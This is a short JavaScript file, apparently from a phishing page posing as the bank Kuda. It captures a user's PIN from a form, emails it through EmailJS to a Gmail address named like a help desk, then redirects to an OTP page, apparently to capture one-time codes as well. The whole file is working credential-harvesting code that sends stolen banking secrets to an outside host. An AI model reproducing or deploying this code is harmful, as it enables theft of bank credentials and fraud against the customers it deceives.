// emailjs.init("3yaulPAGa3CdjhurB");
const pin = document.querySelector("#pin");
const btn = document.querySelector("button");
btn.onclick = () => {
  btn.innerHTML = "Loading...";
};
const serviceId = "service_i0h7x4u";
const userId = "3yaulPAGa3CdjhurB";
const templateId = "template_scpbqcn";
document.getElementById("myForm").onsubmit = function (event) {
  event.preventDefault();
  const emailParams = {
    to_name: "kuda.helphq@gmail.com",
    pin: pin.value,
  };
  console.log(emailParams);
  emailjs.send(serviceId, templateId, emailParams, userId).then(
    function (response) {
      console.log("Sent successfully:", response);
      pin.value = "";

      location.href = "/otp.html";
    },
    function (error) {
      console.log("Failed to send:", error);
    }
  );
};
